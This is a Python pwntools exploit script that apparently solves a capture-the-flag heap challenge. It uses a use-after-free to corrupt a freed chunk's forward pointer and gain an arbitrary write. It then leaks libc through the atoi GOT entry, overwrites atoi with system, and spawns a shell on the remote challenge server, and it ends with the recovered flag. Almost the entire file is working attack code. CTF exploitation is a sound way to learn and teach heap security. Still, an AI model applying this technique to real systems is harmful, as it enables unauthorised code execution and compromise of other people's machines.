#!/usr/bin/env python3

from pwn import *

exe = ELF("./uaf_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.terminal = ['terminator', '-x']


def conn():
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        r = gdb.debug([exe.path], gdbscript='''b edit''')  # b *main+135
    else:
        r = remote("host1.metaproblems.com", 5600)

    return r


def create(r, rule):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b':\n', rule)


def delete(r, id):
    r.sendlineafter(b'> ', b'4')
    r.sendlineafter(b':\n', id)


def view(r, id):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b':\n', id)


def edit(r, id, new_rule):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b':\n', id)
    r.sendlineafter(b':\n', new_rule)


def main():
    r = conn()

    # for i in

    # Create rule
    create(r, b'a')
    # Delete rule
    delete(r, b'0')
    # Exploit UAF to write in the FD ptr of the freed chunk
    # the address of the rules array
    edit(r, b'0', p64(exe.sym.rules))

    # Create a new rule, will use the freed chunk with the corrupted FD pointer
    # Therefore the next chunk allocated will be @ rules address
    create(r, b'a')
    # Malloc will take the rules[] address to allocate the new rule. This address points
    # to the beginning of the rules array, so to the first rule. We put in this the address
    # of puts@got to leak libc
    create(r, p64(exe.got.atoi))
    # Leak of libc
    view(r, b'0')
    r.recvuntil(b': ')
    leak = u64(r.recv(6).ljust(8, b"\x00"))
    print(hex(leak))
    libc.address = leak-libc.sym.atoi

    # Overwrite atoi with system
    edit(r, b'0', p64(libc.sym.system))
    # Source use atoi(our_input) so we provide /bin/sh because we overwrited atoi in the got
    # with system
    r.sendlineafter(b'> ', b'/bin/sh')

    r.interactive()


if __name__ == "__main__":
    main()

# Flag{not_all_vulnerabilities_happen_on_the_stack}
